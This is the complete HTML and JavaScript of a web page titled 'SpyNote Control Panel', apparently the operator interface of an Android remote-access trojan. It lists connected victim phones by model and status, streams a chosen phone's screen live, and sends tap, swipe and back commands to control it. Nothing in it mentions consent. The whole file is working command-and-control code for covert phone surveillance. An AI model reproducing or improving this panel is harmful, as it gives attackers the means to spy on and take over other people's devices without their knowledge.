<!DOCTYPE html>
<html>
<head>
    <title>ðŸ“± SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { 
            padding: 15px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; border-left: 4px solid #666;
        }
        .device:hover { background: #555; transform: translateX(5px); border-left-color: #00ff88; }
        .active { background: #00ff88 !important; color: #000; border-left-color: #00cc66 !important; }
        .disconnected { opacity: 0.5; border-left-color: #ff4444; }

        #phone-frame {
            width: 400px; height: 800px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5); transition: all 0.3s;
        }
        #phone-frame:active { transform: scale(0.98); }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
        }
        #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 14px; color: #00ff88; font-weight: bold; }
        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
            padding: 12px; border-radius: 8px; font-size: 13px; }
        #controls { text-align: center; position: fixed; bottom: 20px; 
            left: 50%; transform: translateX(-50%); }
        button {
            padding: 15px 30px; margin: 0 10px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 16px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
        button:active { transform: translateY(0); }
        .status-connected { color: #00ff88; }
        .status-disconnected { color: #ff4444; }
    </style>
</head>
<body>
    <div id="devices">
        <h3>ðŸ“± Devices (<span id="deviceCount">0</span>)</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div>Resolution: <span id="resolution">-</span></div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">ðŸ”™ Back</button>
        <button onclick="toggleFullScreen()">ðŸ“± Fullscreen</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] }); // âœ… Better perf
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsCounter = document.getElementById('fps-counter');
        const fpsDisplay = document.getElementById('fps');
        const resolutionDisplay = document.getElementById('resolution');
        const deviceCount = document.getElementById('deviceCount');

        // Socket events
        socket.on('connect', () => {
            connectionStatus.textContent = 'âœ… Connected';
            connectionStatus.className = 'status-connected';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // ðŸ”¥ PERFECT Screen Rendering + Scaling
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            try {
                deviceWidth = data.width || deviceWidth;
                deviceHeight = data.height || deviceHeight;
                resolutionDisplay.textContent = `${deviceWidth}x${deviceHeight}`;
                
                const img = new Image();
                img.onload = () => {
                    // âœ… Perfect canvas resize + crisp scaling
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    
                    ctx.imageSmoothingEnabled = false;
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    
                    // âœ… FPS Counter
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsCounter.textContent = `FPS: ${fps}`;
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screen update error:', e);
            }
        });

        // Initial devices load
        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devicesArray) {
            deviceCount.textContent = devicesArray.length;
            deviceList.innerHTML = devicesArray.length ? 
                devicesArray.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,15) || id.slice(0,8)}...</b><br>
                        <small>${info.brand || 'Android'} ${info.version || '?'}</small><br>
                        <span style="font-size:11px;">${info.connected ? 'ðŸŸ¢ LIVE' : 'ðŸ”´ OFFLINE'}</span>
                    </div>
                `).join('') : '<div style="text-align:center;padding:20px;color:#888;">No devices online</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8) + '...';
            resolutionDisplay.textContent = `${deviceWidth}x${deviceHeight}`;
            
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            
            console.log('âœ… Selected device:', deviceId);
        }

        // ðŸ”¥ PERFECT Touch/Mouse Controls + Scaling
        let startX = 0, startY = 0, isDragging = false;

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Touch/Mouse Events
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                isDragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; 
                startY = coords.y;
            }, { passive: false });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!isDragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            }, { passive: false });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (isDragging && currentDevice) {
                    sendTap(startX, startY);
                }
                isDragging = false;
            }, { passive: false });
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
            console.log(`ðŸ‘† Tap: ${x},${y}`);
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, 
                endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
            console.log('ðŸ”™ Back pressed');
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // Prevent zoom on double-tap
        phoneFrame.addEventListener('dblclick', e => e.preventDefault());
        document.addEventListener('gesturestart', e => e.preventDefault());
    </script>
</body>
</html>
